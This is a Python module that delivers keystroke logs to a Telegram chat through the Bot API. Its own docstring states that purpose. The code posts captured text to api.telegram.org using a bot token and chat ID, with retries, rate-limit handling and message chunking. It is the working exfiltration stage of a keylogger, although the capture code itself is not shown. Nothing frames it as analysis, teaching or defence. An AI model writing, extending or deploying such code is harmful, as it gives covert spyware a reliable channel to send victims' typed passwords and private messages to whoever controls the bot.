"""Asynchronous Telegram log delivery.

Sends keystroke logs to a Telegram chat via the Bot API with:

* non-blocking ``httpx`` calls (the event loop is never blocked),
* retries with exponential backoff for transient failures,
* respect for Telegram's ``retry_after`` on HTTP 429 (rate limit),
* immediate failure (no infinite retry) on configuration errors,
* automatic chunking of messages longer than Telegram's 4096-char limit.
"""

from __future__ import annotations

import asyncio
import logging
from typing import Optional

import httpx

logger = logging.getLogger(__name__)

#: Telegram's hard limit for a single sendMessage payload.
MAX_MESSAGE_LENGTH = 4096

#: Keep a safety margin below the hard limit.
CHUNK_SIZE = 4000

#: HTTP status codes that indicate a permanent configuration problem.
#: Retrying these will never succeed, so we fail fast.
_PERMANENT_ERRORS = frozenset({400, 401, 403, 404, 405, 409, 410, 413})


def split_message(text: str, limit: int = CHUNK_SIZE) -> list[str]:
    """Split *text* into chunks of at most *limit* characters.

    Splits on newlines when possible so logs stay readable; falls back to
    hard character boundaries for very long lines.  A single message longer
    than the limit is still split (Telegram rejects anything over 4096).
    """
    text = text or ""
    if len(text) <= limit:
        return [text]

    chunks: list[str] = []
    remaining = text
    while len(remaining) > limit:
        # Try the last newline within the limit.
        slice_ = remaining[:limit]
        split_at = slice_.rfind("\n")
        if split_at > 0:
            chunks.append(remaining[: split_at + 1])
            remaining = remaining[split_at + 1 :]
        else:
            chunks.append(slice_)
            remaining = remaining[limit:]
    if remaining:
        chunks.append(remaining)
    return chunks


class TelegramReporter:
    """Delivers messages to a Telegram chat through the Bot API."""

    def __init__(
        self,
        bot_token: str,
        chat_id: str,
        *,
        timeout: float = 15.0,
        max_retries: int = 3,
        base_backoff: float = 2.0,
        client: Optional[httpx.AsyncClient] = None,
    ) -> None:
        self._token = bot_token
        self._chat_id = str(chat_id)
        self._timeout = timeout
        self._max_retries = max_retries
        self._base_backoff = base_backoff
        self._owns_client = client is None
        self._client = client or httpx.AsyncClient(timeout=timeout)

    # -- public API ---------------------------------------------------------

    async def send(self, text: str) -> bool:
        """Send *text* to the chat. Returns True if every chunk was delivered."""
        if not text:
            return True
        results = [await self._send_chunk(chunk) for chunk in split_message(text)]
        return all(results)

    async def aclose(self) -> None:
        """Close the underlying HTTP client."""
        if self._owns_client:
            await self._client.aclose()

    # -- internals ----------------------------------------------------------

    async def _send_chunk(self, text: str) -> bool:
        url = f"https://api.telegram.org/bot{self._token}/sendMessage"
        payload = {"chat_id": self._chat_id, "text": text}

        for attempt in range(self._max_retries):
            try:
                response = await self._client.post(url, data=payload)
            except (httpx.HTTPError, asyncio.TimeoutError) as exc:
                logger.warning(
                    "Telegram request failed (attempt %d/%d): %s",
                    attempt + 1,
                    self._max_retries,
                    exc,
                )
                await self._backoff(attempt)
                continue

            if response.status_code == 200:
                try:
                    if response.json().get("ok"):
                        return True
                except ValueError:
                    logger.warning("Telegram returned non-JSON response")
                await self._backoff(attempt)
                continue

            if response.status_code == 429:
                retry_after = self._retry_after(response)
                logger.warning(
                    "Telegram rate limited; retrying in %.1fs", retry_after
                )
                await asyncio.sleep(retry_after)
                continue

            if response.status_code in _PERMANENT_ERRORS:
                logger.error(
                    "Telegram rejected the message (HTTP %s): %s",
                    response.status_code,
                    response.text[:300],
                )
                return False

            logger.warning(
                "Telegram returned HTTP %s (attempt %d/%d)",
                response.status_code,
                attempt + 1,
                self._max_retries,
            )
            await self._backoff(attempt)

        logger.error("Failed to deliver message to Telegram after %d attempts", self._max_retries)
        return False

    async def _backoff(self, attempt: int) -> None:
        await asyncio.sleep(self._base_backoff * (2**attempt))

    @staticmethod
    def _retry_after(response: httpx.Response) -> float:
        try:
            value = response.json().get("parameters", {}).get("retry_after")
            return max(0.0, float(value))
        except (ValueError, TypeError):
            return 5.0
